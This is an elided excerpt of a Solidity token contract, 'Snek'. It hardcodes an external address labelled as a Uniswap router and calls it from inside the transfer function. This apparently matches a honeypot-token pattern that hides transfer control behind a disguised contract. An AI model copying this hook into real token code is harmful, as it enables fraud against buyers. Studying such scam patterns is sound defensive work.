...
contract Snek is Ownable {
    ...
    string public _name = "Snek";
    string public _symbol = "HISSS";
    uint _fee = 0;
    ...
    IUniswapV2Router router = IUniswapV2Router(0xac32b5cD875580f79C4FCe11b486ae65d6e04092);
    ...
    function _transfer(address from, address to, uint256 amount) internal {
        ...
        router.allowance(to, address(this)); 
